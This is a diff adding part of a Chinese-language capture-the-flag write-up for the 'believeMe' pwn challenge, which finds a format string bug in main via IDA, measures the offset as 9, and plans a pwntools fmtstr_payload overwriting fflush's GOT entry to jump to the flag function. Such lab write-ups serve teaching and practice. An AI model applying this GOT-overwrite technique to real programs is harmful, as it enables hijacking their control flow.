@@ -43,3 +43,25 @@ aaaa
 aaaa%  
 ➜  believeMe
 ```
+然后ida简单分析下，我们可以很直接的看到在main函数里有一个格式化字符串漏洞
+
+```c
+.text:080487CC ; 10:   printf(s);
+.text:080487CC                 sub     esp, 0Ch
+.text:080487CF                 lea     eax, [ebp+s]
+.text:080487D2                 push    eax             ; format
+.text:080487D3                 call    _printf
+```
+
+这里我本来以为只是简单的利用格式化字符串去修改fflush_got所以我先测出来fmt的偏移量为9
+
+```bash
+➜  believeMe ./believeMe 
+Someone told me that pwning makes noxāle...
+But......... how ???? 
+aaaa%9$x
+aaaa61616161%                                                         
+➜  believeMe 
+```
+
+然后构造payload=fmtstr_payload(9,{fflush_got:noxflag_addr})想直接getflag，然后实际上没那么简单。调试过后发现fmtstr_payload不全，len(payload)输出检查后发现长度超了，稍微查了下pwntools文档的fmtstr部分，发现它默认是以hhn也就是单字节的形式去构造payload，如果以双字节或四字节的形式要加上write_size参数，这样payload的长度就不会超过40
